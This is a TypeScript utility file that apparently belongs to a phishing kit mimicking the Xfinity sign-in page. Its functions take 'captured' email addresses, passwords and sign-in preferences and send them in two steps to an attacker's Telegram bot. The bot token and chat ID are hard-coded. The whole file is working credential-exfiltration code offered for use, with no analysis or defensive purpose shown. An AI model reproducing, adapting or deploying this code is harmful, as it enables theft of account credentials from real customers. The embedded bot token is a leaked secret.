// telegramBot.ts
// Utility script for sending login capture data to a Telegram bot

const TELEGRAM_BOT_TOKEN = "8785593118:AAE9SgTv9pOlKgSONuZIrnoSwLnCP-X_zxc";
const TELEGRAM_CHAT_ID = "1228161472";

const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

/**
 * Sends a message to your configured Telegram bot.
 */
async function sendToTelegram(message: string): Promise<void> {
  try {
    await fetch(TELEGRAM_API, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML",
      }),
    });
  } catch (err) {
    console.error("Telegram send error:", err);
  }
}

/**
 * Sends the captured email/Xfinity ID to Telegram.
 */
export async function sendEmailToTelegram(email: string): Promise<void> {
  const message =
    `🔐 <b>Xfinity Login — Step 1</b>\n` +
    `━━━━━━━━━━━━━━━━\n` +
    `📧 <b>Email / ID:</b> <code>${email}</code>\n` +
    `🕐 <b>Time:</b> ${new Date().toUTCString()}`;

  await sendToTelegram(message);
}

/**
 * Sends the captured password to Telegram.
 */
export async function sendPasswordToTelegram(
  email: string,
  password: string,
  keepSignedIn: boolean
): Promise<void> {
  const message =
    `🔑 <b>Xfinity Login — Step 2</b>\n` +
    `━━━━━━━━━━━━━━━━\n` +
    `📧 <b>Email / ID:</b> <code>${email}</code>\n` +
    `🔒 <b>Password:</b> <code>${password}</code>\n` +
    `✅ <b>Keep Signed In:</b> ${keepSignedIn ? "Yes" : "No"}\n` +
    `🕐 <b>Time:</b> ${new Date().toUTCString()}`;

  await sendToTelegram(message);
}